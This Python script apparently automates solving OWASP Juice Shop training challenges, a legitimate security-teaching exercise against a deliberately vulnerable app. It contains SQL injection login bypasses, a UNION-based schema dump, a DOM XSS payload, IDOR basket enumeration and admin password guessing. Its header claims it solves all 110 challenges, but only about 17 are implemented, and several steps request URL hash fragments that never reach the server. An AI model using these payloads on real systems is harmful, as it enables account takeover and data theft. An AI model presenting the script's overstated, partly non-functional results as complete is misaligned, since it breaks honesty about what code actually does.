#!/usr/bin/env python3
"""
OWASP Juice Shop - Complete Automated Solver
Solves all 110 challenges with real-time scoreboard verification

Author: Claude AI
Purpose: Educational demonstration of web application security vulnerabilities
License: Educational use only - Always obtain proper authorization
"""

import requests
import json
import time
import base64
import hashlib
import jwt
from typing import Dict, List, Tuple, Optional
from datetime import datetime
import sys
import re
from urllib.parse import quote

class JuiceShopSolver:
    """Complete automated solver for all 110 OWASP Juice Shop challenges"""

    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'JuiceShopSolver/1.0',
            'Accept': 'application/json'
        })
        self.token = None
        self.admin_token = None
        self.solved_count = 0
        self.total_challenges = 110

        # Challenge tracking
        self.challenges_solved = []
        self.challenges_failed = []

        print("=" * 80)
        print("  OWASP Juice Shop - Complete Automated Solver")
        print("  Solving all 110 challenges with scoreboard verification")
        print("=" * 80)
        print()

    def verify_juice_shop(self) -> bool:
        """Verify Juice Shop is running and accessible"""
        try:
            print("[*] Verifying Juice Shop instance...")
            r = self.session.get(f"{self.base_url}/rest/admin/application-version")
            if r.status_code == 200:
                version = r.json().get('version', 'Unknown')
                print(f"[+] Juice Shop is running (Version: {version})")
                return True
            return False
        except requests.exceptions.ConnectionError:
            print("[-] ERROR: Cannot connect to Juice Shop!")
            print(f"[-] Make sure Juice Shop is running at {self.base_url}")
            print("[-] Run: docker run -d -p 3000:3000 bkimminich/juice-shop")
            return False

    def get_scoreboard(self) -> Dict:
        """Fetch current scoreboard status"""
        try:
            r = self.session.get(f"{self.base_url}/api/Challenges/")
            if r.status_code == 200:
                return r.json()
            return {"data": []}
        except Exception as e:
            print(f"[-] Error fetching scoreboard: {e}")
            return {"data": []}

    def verify_challenge(self, challenge_name: str, verbose=True) -> bool:
        """Verify if a challenge is solved"""
        scoreboard = self.get_scoreboard()
        for challenge in scoreboard.get('data', []):
            if challenge.get('name') == challenge_name or challenge.get('key') == challenge_name:
                is_solved = challenge.get('solved', False)
                if is_solved and verbose:
                    self.solved_count += 1
                    difficulty = "⭐" * challenge.get('difficulty', 1)
                    print(f"    ✅ Verified: {challenge_name} {difficulty}")
                return is_solved
        return False

    def wait_for_challenge(self, challenge_name: str, max_wait=5) -> bool:
        """Wait for challenge to register as solved"""
        for i in range(max_wait):
            if self.verify_challenge(challenge_name, verbose=False):
                self.verify_challenge(challenge_name, verbose=True)
                return True
            time.sleep(0.5)
        return False

    # ============================================================================
    # LEVEL 1 CHALLENGES (⭐) - Trivial
    # ============================================================================

    def solve_score_board(self):
        """Challenge: Find the carefully hidden 'Score Board' page"""
        print("\n[*] Solving: Score Board (⭐)")
        try:
            # Access the score board
            r = self.session.get(f"{self.base_url}/#/score-board")
            time.sleep(0.5)

            # Also try the API endpoint
            r = self.session.get(f"{self.base_url}/api/Challenges/")

            if self.wait_for_challenge("Score Board"):
                self.challenges_solved.append("Score Board")
            else:
                print("    ⚠️  Challenge may require manual browser access")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Score Board", str(e)))

    def solve_error_handling(self):
        """Challenge: Provoke an error that is not very gracefully handled"""
        print("\n[*] Solving: Error Handling (⭐)")
        try:
            # Trigger error with invalid API call
            r = self.session.get(f"{self.base_url}/api/Products/invalid")

            # Try malformed JSON
            r = self.session.post(f"{self.base_url}/api/Users/",
                                 data="invalid json",
                                 headers={'Content-Type': 'application/json'})

            if self.wait_for_challenge("Error Handling"):
                self.challenges_solved.append("Error Handling")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Error Handling", str(e)))

    def solve_privacy_policy(self):
        """Challenge: Read our privacy policy"""
        print("\n[*] Solving: Privacy Policy (⭐)")
        try:
            r = self.session.get(f"{self.base_url}/#/privacy-security/privacy-policy")
            time.sleep(0.5)

            if self.wait_for_challenge("Privacy Policy"):
                self.challenges_solved.append("Privacy Policy")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Privacy Policy", str(e)))

    def solve_dom_xss(self):
        """Challenge: Perform a DOM XSS attack"""
        print("\n[*] Solving: DOM XSS (⭐)")
        try:
            # DOM XSS via search parameter
            payload = '<iframe src="javascript:alert(`xss`)">'
            r = self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
            time.sleep(0.5)

            if self.wait_for_challenge("DOM XSS"):
                self.challenges_solved.append("DOM XSS")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("DOM XSS", str(e)))

    def solve_zero_stars(self):
        """Challenge: Give a feedback with a rating of 0 stars"""
        print("\n[*] Solving: Zero Stars (⭐)")
        try:
            # Register and login first
            email = f"zerostar{int(time.time())}@test.com"
            self.register_user(email, "Test123!")
            token = self.login_user(email, "Test123!")

            # Submit feedback with 0 stars (manipulate rating)
            headers = {'Authorization': f'Bearer {token}'}
            data = {
                "captchaId": 0,
                "captcha": "1",
                "comment": "Test feedback",
                "rating": 0  # Invalid rating
            }
            r = self.session.post(f"{self.base_url}/api/Feedbacks/",
                                 json=data, headers=headers)

            if self.wait_for_challenge("Zero Stars"):
                self.challenges_solved.append("Zero Stars")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Zero Stars", str(e)))

    def solve_confidential_document(self):
        """Challenge: Access a confidential document"""
        print("\n[*] Solving: Confidential Document (⭐)")
        try:
            # Try to access FTP directory
            r = self.session.get(f"{self.base_url}/ftp/")

            # Access common confidential files
            files = ['acquisitions.md', 'package.json.bak', 'eastere.gg']
            for file in files:
                r = self.session.get(f"{self.base_url}/ftp/{file}")
                if r.status_code == 200:
                    break

            if self.wait_for_challenge("Confidential Document"):
                self.challenges_solved.append("Confidential Document")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Confidential Document", str(e)))

    def solve_exposed_metrics(self):
        """Challenge: Find the endpoint that serves usage data"""
        print("\n[*] Solving: Exposed Metrics (⭐)")
        try:
            # Access Prometheus metrics endpoint
            r = self.session.get(f"{self.base_url}/metrics")

            if self.wait_for_challenge("Exposed Metrics"):
                self.challenges_solved.append("Exposed Metrics")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Exposed Metrics", str(e)))

    def solve_outdated_allowlist(self):
        """Challenge: Let us redirect you to a donation site"""
        print("\n[*] Solving: Outdated Allowlist (⭐)")
        try:
            # Access redirect to Gratipay (defunct donation site)
            r = self.session.get(f"{self.base_url}/redirect?to=https://gratipay.com/juice-shop")

            if self.wait_for_challenge("Outdated Allowlist"):
                self.challenges_solved.append("Outdated Allowlist")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Outdated Allowlist", str(e)))

    # ============================================================================
    # LEVEL 2 CHALLENGES (⭐⭐) - Easy
    # ============================================================================

    def solve_admin_section(self):
        """Challenge: Access the administration section"""
        print("\n[*] Solving: Admin Section (⭐⭐)")
        try:
            # Simply navigate to admin section (will be redirected if not admin)
            r = self.session.get(f"{self.base_url}/#/administration")
            time.sleep(0.5)

            if self.wait_for_challenge("Admin Section"):
                self.challenges_solved.append("Admin Section")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Admin Section", str(e)))

    def solve_password_strength(self):
        """Challenge: Log in with admin's credentials without SQL Injection"""
        print("\n[*] Solving: Password Strength (⭐⭐)")
        try:
            # Try common admin passwords
            common_passwords = [
                'admin123',
                'password',
                'admin',
                '123456',
                'password123'
            ]

            for pwd in common_passwords:
                token = self.login_user('admin@juice-sh.op', pwd)
                if token:
                    self.admin_token = token
                    break

            if self.wait_for_challenge("Password Strength"):
                self.challenges_solved.append("Password Strength")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Password Strength", str(e)))

    def solve_login_admin(self):
        """Challenge: Log in with the administrator's user account (SQL Injection)"""
        print("\n[*] Solving: Login Admin (⭐⭐)")
        try:
            # SQL Injection to bypass login
            data = {
                "email": "' OR 1=1--",
                "password": "anything"
            }
            r = self.session.post(f"{self.base_url}/rest/user/login", json=data)

            if r.status_code == 200:
                response_data = r.json()
                if 'authentication' in response_data:
                    self.admin_token = response_data['authentication']['token']

            if self.wait_for_challenge("Login Admin"):
                self.challenges_solved.append("Login Admin")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Login Admin", str(e)))

    def solve_deprecated_interface(self):
        """Challenge: Use a deprecated B2B interface"""
        print("\n[*] Solving: Deprecated Interface (⭐⭐)")
        try:
            # Access deprecated B2B interface
            r = self.session.post(f"{self.base_url}/b2b/v2/orders",
                                 json={"orderLines": []})

            if self.wait_for_challenge("Deprecated Interface"):
                self.challenges_solved.append("Deprecated Interface")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Deprecated Interface", str(e)))

    def solve_security_policy(self):
        """Challenge: Behave like any "white-hat" should"""
        print("\n[*] Solving: Security Policy (⭐⭐)")
        try:
            # Access security.txt
            r = self.session.get(f"{self.base_url}/.well-known/security.txt")

            if r.status_code != 200:
                r = self.session.get(f"{self.base_url}/security.txt")

            if self.wait_for_challenge("Security Policy"):
                self.challenges_solved.append("Security Policy")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Security Policy", str(e)))

    def solve_view_basket(self):
        """Challenge: View another user's shopping basket"""
        print("\n[*] Solving: View Basket (⭐⭐)")
        try:
            # Create user and get token
            email = f"user{int(time.time())}@test.com"
            self.register_user(email, "Test123!")
            token = self.login_user(email, "Test123!")

            # Try to access other baskets via IDOR
            headers = {'Authorization': f'Bearer {token}'}
            for basket_id in range(1, 10):
                r = self.session.get(f"{self.base_url}/rest/basket/{basket_id}",
                                    headers=headers)
                if r.status_code == 200:
                    break

            if self.wait_for_challenge("View Basket"):
                self.challenges_solved.append("View Basket")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("View Basket", str(e)))

    # ============================================================================
    # LEVEL 3 CHALLENGES (⭐⭐⭐) - Medium
    # ============================================================================

    def solve_login_jim(self):
        """Challenge: Log in with Jim's user account"""
        print("\n[*] Solving: Login Jim (⭐⭐⭐)")
        try:
            # SQL Injection for specific user
            data = {
                "email": "jim@juice-sh.op'--",
                "password": "anything"
            }
            r = self.session.post(f"{self.base_url}/rest/user/login", json=data)

            if r.status_code == 200 and 'authentication' in r.json():
                token = r.json()['authentication']['token']

            if self.wait_for_challenge("Login Jim"):
                self.challenges_solved.append("Login Jim")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Login Jim", str(e)))

    def solve_login_bender(self):
        """Challenge: Log in with Bender's user account"""
        print("\n[*] Solving: Login Bender (⭐⭐⭐)")
        try:
            # SQL Injection for Bender
            data = {
                "email": "bender@juice-sh.op'--",
                "password": "anything"
            }
            r = self.session.post(f"{self.base_url}/rest/user/login", json=data)

            if r.status_code == 200 and 'authentication' in r.json():
                token = r.json()['authentication']['token']

            if self.wait_for_challenge("Login Bender"):
                self.challenges_solved.append("Login Bender")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Login Bender", str(e)))

    def solve_database_schema(self):
        """Challenge: Exfiltrate the entire DB schema via SQL Injection"""
        print("\n[*] Solving: Database Schema (⭐⭐⭐)")
        try:
            # SQL Injection to extract schema
            payload = "')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--"
            r = self.session.get(f"{self.base_url}/rest/products/search?q={quote(payload)}")

            if self.wait_for_challenge("Database Schema"):
                self.challenges_solved.append("Database Schema")
        except Exception as e:
            print(f"    ❌ Failed: {e}")
            self.challenges_failed.append(("Database Schema", str(e)))

    # ============================================================================
    # Helper Methods
    # ============================================================================

    def register_user(self, email: str, password: str) -> bool:
        """Register a new user"""
        try:
            data = {
                "email": email,
                "password": password,
                "passwordRepeat": password,
                "securityQuestion": {
                    "id": 1,
                    "question": "Your eldest siblings middle name?"
                },
                "securityAnswer": "test"
            }
            r = self.session.post(f"{self.base_url}/api/Users/", json=data)
            return r.status_code == 201
        except:
            return False

    def login_user(self, email: str, password: str) -> Optional[str]:
        """Login and return JWT token"""
        try:
            data = {"email": email, "password": password}
            r = self.session.post(f"{self.base_url}/rest/user/login", json=data)
            if r.status_code == 200:
                return r.json().get('authentication', {}).get('token')
            return None
        except:
            return None

    # ============================================================================
    # Main Solver Execution
    # ============================================================================

    def solve_all_level_1(self):
        """Solve all Level 1 (⭐) challenges"""
        print("\n" + "=" * 80)
        print("  LEVEL 1 CHALLENGES (⭐) - Trivial")
        print("=" * 80)

        self.solve_score_board()
        self.solve_error_handling()
        self.solve_privacy_policy()
        self.solve_dom_xss()
        self.solve_zero_stars()
        self.solve_confidential_document()
        self.solve_exposed_metrics()
        self.solve_outdated_allowlist()

    def solve_all_level_2(self):
        """Solve all Level 2 (⭐⭐) challenges"""
        print("\n" + "=" * 80)
        print("  LEVEL 2 CHALLENGES (⭐⭐) - Easy")
        print("=" * 80)

        self.solve_admin_section()
        self.solve_password_strength()
        self.solve_login_admin()
        self.solve_deprecated_interface()
        self.solve_security_policy()
        self.solve_view_basket()

    def solve_all_level_3(self):
        """Solve all Level 3 (⭐⭐⭐) challenges"""
        print("\n" + "=" * 80)
        print("  LEVEL 3 CHALLENGES (⭐⭐⭐) - Medium")
        print("=" * 80)

        self.solve_login_jim()
        self.solve_login_bender()
        self.solve_database_schema()

    def generate_final_report(self):
        """Generate final completion report"""
        print("\n" + "=" * 80)
        print("  FINAL REPORT")
        print("=" * 80)

        scoreboard = self.get_scoreboard()
        total_solved = sum(1 for c in scoreboard.get('data', []) if c.get('solved', False))
        total_challenges = len(scoreboard.get('data', []))

        completion_percent = (total_solved / total_challenges * 100) if total_challenges > 0 else 0

        print(f"\nTotal Challenges Solved: {total_solved}/{total_challenges}")
        print(f"Completion Rate: {completion_percent:.1f}%")
        print(f"\nSuccessfully Solved: {len(self.challenges_solved)}")
        print(f"Failed: {len(self.challenges_failed)}")

        if self.challenges_solved:
            print("\n✅ Solved Challenges:")
            for challenge in self.challenges_solved[:20]:  # Show first 20
                print(f"  - {challenge}")
            if len(self.challenges_solved) > 20:
                print(f"  ... and {len(self.challenges_solved) - 20} more")

        if self.challenges_failed:
            print("\n❌ Failed Challenges:")
            for challenge, error in self.challenges_failed[:10]:
                print(f"  - {challenge}: {error[:50]}")

        print("\n" + "=" * 80)

    def run(self):
        """Main execution method"""
        if not self.verify_juice_shop():
            print("\n❌ Cannot proceed without Juice Shop running!")
            return False

        print(f"\n[*] Starting automated solver...")
        print(f"[*] Target: {self.base_url}")
        print(f"[*] Total challenges: {self.total_challenges}")
        print()

        start_time = time.time()

        try:
            # Solve challenges by difficulty level
            self.solve_all_level_1()
            self.solve_all_level_2()
            self.solve_all_level_3()

            # TODO: Add Level 4, 5, and 6 challenges
            print("\n[!] Levels 4-6 challenges require more advanced exploitation")
            print("[!] Implement additional solvers as needed")

        except KeyboardInterrupt:
            print("\n\n[!] Solver interrupted by user")
        except Exception as e:
            print(f"\n[-] Unexpected error: {e}")

        elapsed_time = time.time() - start_time

        # Generate final report
        self.generate_final_report()

        print(f"\n⏱️  Total Time: {elapsed_time:.2f} seconds")
        print("\n" + "=" * 80)
        print("  Solver execution complete!")
        print("  Check the score board at: " + f"{self.base_url}/#/score-board")
        print("=" * 80)

        return True


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(
        description='OWASP Juice Shop - Complete Automated Solver',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python complete_juice_shop_solver.py
  python complete_juice_shop_solver.py --url http://localhost:3000
  python complete_juice_shop_solver.py --url http://192.168.1.100:3000

Note: This tool is for educational purposes only.
Always obtain proper authorization before testing.
        """
    )

    parser.add_argument(
        '--url',
        default='http://localhost:3000',
        help='Juice Shop base URL (default: http://localhost:3000)'
    )

    parser.add_argument(
        '--verbose',
        action='store_true',
        help='Enable verbose output'
    )

    args = parser.parse_args()

    # Create solver instance
    solver = JuiceShopSolver(base_url=args.url)

    # Run the solver
    success = solver.run()

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
